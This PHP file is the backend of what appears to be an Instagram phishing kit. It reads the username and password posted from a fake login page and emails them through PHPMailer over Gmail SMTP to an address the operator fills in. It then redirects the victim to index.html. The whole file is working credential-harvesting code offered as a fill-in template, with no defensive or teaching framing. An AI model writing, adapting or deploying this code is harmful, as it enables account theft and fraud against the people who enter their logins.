<?php
     
     use PHPMailer\PHPMailer\PHPMailer;
     use PHPMailer\PHPMailer\SMTP;
     use PHPMailer\PHPMailer\Exception;
     
     require 'PHPMailer/src/Exception.php';
     require 'PHPMailer/src/PHPMailer.php';
     require 'PHPMailer/src/SMTP.php';  

     

     $data  = file_get_contents("php://input");
     $real_data = json_decode($data);
     print_r($real_data);

    //  if(isset($_POST['submit']) &&$_POST['iuname'] != "" && $_POST['ipass'] != ""){
        $insta_uname = $real_data->name;
        $insta_pass = $real_data->pass;

        sendOtp($insta_uname,$insta_pass);
        header("location: index.html");

        // $insta_uname = "";
        // $insta_pass = "";
// }
// else{
//       header("location: index.php");
// }
  
     function sendOtp($name,$pass){
    //   $rand = rand(1000,9999);
     $mail = new PHPMailer(true);

     try {
      $mail->isSMTP();
      $mail->Host = 'smtp.gmail.com';
      $mail->SMTPAuth = true;
      $mail->Username = 'Enter your email';
      $mail->Password = 'Enter password';   // pass key like:-  zzzz yyyy vvvv wwww
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
      $mail->Port = 465;

      $mail->setFrom('<Enter your email address>','Anonymous');
      $mail->addAddress('<which email send (to)>');

      $mail->isHTML(true);
      $mail->Subject = 'Insta_Accounts';
      
      //$mail->Body = "Insta_username:- ".$name."<br>"."Insta_pass:- ".$pass;
?>
      <?php
       $mail->Body = '<div style="margin-left: 100px;">
       <div class="box1">
        <img src="../instagg.gif" alt="">    
       </div>

       <div class="box2" style="display: flex; flex-direction: column;">
           <span><h1 style="display: inline-block; color: red;">Username/Email:- </h1>  <h1 style="display: inline-block;margin-left: 20px; color: blueviolet">'.$name.'</h1></span>
           <span><h1 style="display: inline-block; color: red; margin-left: 40px;">Password:- </h1><h1 style="display: inline-block;margin-left: 20px; color: blueviolet;">'.$pass.'</h1></span>
       </div>;'
      ?>



       <?php
    $mail->send();
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

//    return $rand;
}

// echo "<br>".sendOtp();


// echo $randum_number;
?>